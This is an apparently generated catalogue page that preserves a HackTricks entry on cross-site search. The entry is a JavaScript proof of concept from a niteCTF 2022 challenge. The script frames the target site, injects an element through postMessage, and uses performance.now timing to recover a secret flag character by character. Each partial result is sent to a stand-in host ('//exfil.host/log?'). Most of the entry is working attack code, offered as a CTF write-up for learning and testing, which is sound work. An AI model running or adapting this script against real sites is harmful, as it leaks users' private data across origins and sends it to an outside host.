---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# performance.now example

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-pentesting-web-xs-search-performance.now-example` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xs-search/performance.now-example.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [performance.now example](../../topics/pentesting-web/performance.now-example.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-pentesting-web-xs-search-performance.now-example |
| name | performance.now example |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/xs-search/performance.now-example.md |

## Preserved Source Material

````yaml
_body: "# performance.now example\n\n{{#include ../../banners/hacktricks-training.md}}\n\n**Example taken from [https://ctf.zeyu2001.com/2022/nitectf-2022/js-api](https://ctf.zeyu2001.com/2022/nitectf-2022/js-api)**\n\
  \n```javascript\nconst sleep = (ms) => new Promise((res) => setTimeout(res, ms))\n\nasync function check(flag) {\n  let\
  \ w = frame.contentWindow\n  w.postMessage(\n    { op: \"preview\", payload: '<img name=\"enable_experimental_features\"\
  >' },\n    \"*\"\n  )\n  await sleep(1)\n  w.postMessage({ op: \"search\", payload: flag }, \"*\")\n  let t1 = performance.now()\n\
  \  await sleep(1)\n  return performance.now() - t1 > 200\n}\n\nasync function main() {\n  let alpha =\n    \"abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-}\"\
  \n  window.frame = document.createElement(\"iframe\")\n  frame.width = \"100%\"\n  frame.height = \"700px\"\n  frame.src\
  \ = \"https://challenge.jsapi.tech/\"\n  document.body.appendChild(frame)\n  await sleep(1000)\n\n  let flag = \"nite{\"\
  \n  while (1) {\n    for (let c of alpha) {\n      let result = await Promise.race([\n        check(flag + c),\n       \
  \ new Promise((res) =>\n          setTimeout(() => {\n            res(true)\n          }, 300)\n        ),\n      ])\n \
  \     console.log(flag + c, result)\n      if (result) {\n        flag += c\n        break\n      }\n    }\n    new Image().src\
  \ = \"//exfil.host/log?\" + encodeURIComponent(flag)\n  }\n}\n\ndocument.addEventListener(\"DOMContentLoaded\", main)\n\
  ```\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: pentesting-web/xs-search/performance.now-example.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/pentesting-web/xs-search/performance.now-example.md
````
